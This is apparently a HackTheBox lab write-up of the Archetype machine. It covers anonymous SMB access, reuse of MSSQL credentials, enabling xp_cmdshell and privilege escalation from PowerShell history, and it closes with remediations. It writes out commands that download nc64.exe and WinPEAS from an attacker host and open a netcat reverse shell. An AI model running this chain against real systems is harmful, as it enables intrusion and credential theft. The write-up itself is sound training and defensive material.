# Archetype — HTB Starting Point Writeup

**Difficulty:** Beginner | **OS:** Windows | **Date:** May 2026

**Topics:** SMB Enumeration, MSSQL, xp_cmdshell, WinPEAS, Credential Reuse

---

## Summary

Archetype is a Windows Starting Point machine on HackTheBox. The attack chain involves anonymous SMB access to retrieve MSSQL credentials from a config file, enabling xp_cmdshell for remote code execution, and privilege escalation via credentials found in a PowerShell history file.

---

## Reconnaissance

### Nmap Scan

```
nmap -sC -sV -p- --min-rate 5000 <TARGET-IP> -oN archetype_nmap.txt
```

**Open Ports:**
- 135 — MSRPC
- 139 — NetBIOS
- 445 — SMB
- 1433 — MSSQL (Microsoft SQL Server 2017)

### SMB Enumeration

```
smbclient -N -L //<TARGET-IP>
smbclient -N //<TARGET-IP>/backups
get prod.dtsConfig
```

The `prod.dtsConfig` file exposed plaintext MSSQL credentials:
- **User:** ARCHETYPE\sql_svc
- **Password:** [REDACTED]

---

## Initial Access

### MSSQL Login

```
python3 mssqlclient.py ARCHETYPE/sql_svc@<TARGET-IP> -windows-auth
```

### Enable xp_cmdshell

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### Reverse Shell

Upload nc64.exe via PowerShell, then execute:

```powershell
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<ATTACKER-IP>/nc64.exe -outfile nc64.exe"
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <ATTACKER-IP> 443"
```

Listener on attacker:
```
nc -lvnp 443
```

---

## User Flag

```
type C:\Users\sql_svc\Desktop\user.txt
```

**User Flag:** [REDACTED]

---

## Privilege Escalation

### WinPEAS Enumeration

```powershell
wget http://<ATTACKER-IP>/winPEAS.exe -outfile winPEAS.exe
.\winPEAS.exe
```

WinPEAS revealed PowerShell history file containing administrator credentials.

### PowerShell History

```
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Credentials found:
- **User:** administrator
- **Password:** [REDACTED]

### PSExec to SYSTEM

```
python3 psexec.py administrator@<TARGET-IP>
```

---

## Root Flag

```
type C:\Users\Administrator\Desktop\root.txt
```

**Root Flag:** [REDACTED]

---

## Findings

| # | Finding | Severity | CVSSv3 |
|---|---------|----------|--------|
| 1 | Anonymous SMB Access to Sensitive Share | High | 7.5 |
| 2 | Plaintext Credentials in Config File | Critical | 9.1 |
| 3 | MSSQL xp_cmdshell Enabled | Critical | 9.8 |
| 4 | Credentials Stored in PowerShell History | High | 7.8 |

### Remediations

1. **Disable anonymous SMB access.** Restrict share permissions to authenticated users only.
2. **Never store plaintext credentials in config files.** Use Windows Credential Manager or secrets management tools.
3. **Disable xp_cmdshell.** It should not be enabled unless absolutely required and properly restricted.
4. **Clear PSReadLine history.** Implement GPO to prevent sensitive data from being logged in command history files.

---

## Key Takeaways

- Always enumerate SMB shares for sensitive files
- Config files (.dtsConfig, web.config) often contain plaintext credentials
- xp_cmdshell is a direct RCE path when MSSQL sysadmin access is obtained
- PSReadLine history is a goldmine during Windows post-exploitation
- Always run WinPEAS after initial shell access

---

## Tools Used

- Nmap, smbclient
- Impacket (mssqlclient.py, psexec.py)
- nc64.exe (Netcat for Windows)
- WinPEAS
